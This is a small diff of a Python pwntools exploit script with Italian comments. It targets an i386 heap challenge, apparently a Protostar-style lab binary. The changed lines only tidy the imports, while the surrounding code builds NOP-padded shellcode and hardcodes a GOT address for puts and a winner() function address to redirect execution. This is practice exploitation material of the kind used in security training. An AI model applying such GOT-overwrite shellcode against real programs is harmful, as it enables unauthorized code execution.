@@ -2,7 +2,7 @@
  
 import struct
 import sys
-import pwnlib
+from pwnlib import shellcraft, asm, context
  
 PUTS = 0x804c13c - 12 # Posizione dell'indirizzo della funzione puts nella GOT
 WINNER = 0x080487d5   # Indirizzo della funzione winner()
@@ -10,12 +10,12 @@ RETADDR = 0xf7e69000 + 12  # Indirizzo a cui il EIP salta dopo aver chiamato put
  
 # Chunk A
 out  = b""
- 
-pwnlib.context.arch = "i386"
-shellcode = pwnlib.shellcraft.i386.push(WINNER)
-shellcode += pwnlib.shellcraft.i386.ret()
-shellcode = pwnlib.asm.asm(shellcode, arch='i386')
- 
+
+context.arch = "i386"
+shellcode = shellcraft.i386.push(WINNER)
+shellcode += shellcraft.i386.ret()
+shellcode = asm.asm(shellcode, arch='i386')
+
 out += b"\x90"*4 + shellcode
  
 # Chunk B
